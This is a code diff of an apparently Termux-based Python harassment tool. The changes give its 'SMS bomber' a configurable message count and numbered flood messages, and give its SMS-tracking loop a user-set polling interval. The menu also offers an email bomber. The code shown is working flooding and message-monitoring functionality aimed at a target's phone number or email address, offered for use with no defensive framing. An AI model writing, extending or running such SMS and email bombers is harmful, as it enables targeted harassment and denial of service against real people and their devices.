@@ -52,7 +52,7 @@ def forward_sms(phone_number, message):
     print(f"{G}[+] New Message from {phone_number}: {W}{message}")
 
 # Start Tracking
-def start_tracking(phone_number):
+def start_tracking(phone_number, update_interval):
     print(f"{Y}Tracking SMS for {phone_number}...{W}")
     print(f"{C}Press CTRL + C to stop.{W}\n")
 
@@ -65,16 +65,18 @@ def start_tracking(phone_number):
                     body = sms.split(",")[1].split(":")[1].strip().strip('"')
                     if sender == phone_number:
                         forward_sms(sender, body)
-            time.sleep(5)  # Refresh every 5 seconds
+            time.sleep(update_interval)  # Refresh every X seconds based on user input
     except KeyboardInterrupt:
         print(f"{R}\nTracking stopped. Exiting...{W}")
 
 # Function to perform SMS Bombing
-def sms_bomber(phone_number, delay):
+def sms_bomber(phone_number, delay, bomb_count):
     print(f"{Y}Starting SMS Bombing on {phone_number}...{W}")
-    while True:
-        subprocess.run(["termux-sms-send", "-n", phone_number, "Bombing message!"])
-        time.sleep(delay)
+    for i in range(bomb_count):
+        subprocess.run(["termux-sms-send", "-n", phone_number, f"Bombing message {i+1}!"])
+        print(f"{G}[{i+1}] SMS Sent!{W}")
+        time.sleep(delay)  # Delay between sending each SMS
+    print(f"{G}Bombing completed!{W}")
 
 # Email Bomber Function
 def email_bomber(target_email, subject, body, count):
@@ -111,12 +113,14 @@ def main():
 
     if choice == "1":
         phone_number = get_phone_number()
-        start_tracking(phone_number)
+        update_interval = int(input(f"{C}Enter update interval (in seconds) for checking new messages (5, 10, or 30): {W}"))
+        start_tracking(phone_number, update_interval)
 
     elif choice == "2":
         phone_number = get_phone_number()
+        bomb_count = int(input(f"{C}Enter the number of SMS bombs to send (e.g., 50, 100, or a custom number): {W}"))
         delay = float(input(f"{C}Enter delay (in seconds) between messages: {W}"))
-        sms_bomber(phone_number, delay)
+        sms_bomber(phone_number, delay, bomb_count)
 
     elif choice == "3":
         target_email = input(f"{C}Enter target email: {W}")
